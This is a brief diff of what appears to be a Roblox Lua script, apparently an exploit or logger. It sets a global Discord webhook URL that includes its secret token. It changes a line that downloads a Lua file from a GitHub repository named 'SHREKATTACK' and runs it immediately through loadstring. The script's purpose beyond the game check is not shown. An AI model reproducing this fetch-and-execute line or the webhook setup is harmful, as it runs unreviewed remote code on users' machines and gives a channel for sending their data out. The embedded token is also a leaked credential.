@@ -1,5 +1,5 @@
 _G.webhooksdiscord = "https://discord.com/api/webhooks/995172073720774767/taDW9cCaCAPUZTdApti30gKOYJAQUcbslXKKxO5IDv-Iq7O3f7XIdK4fOC_U7tDEVEUC"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"))()
 local TweenService = game:GetService("TweenService")
 
 if game.PlaceId == 4954752502 then
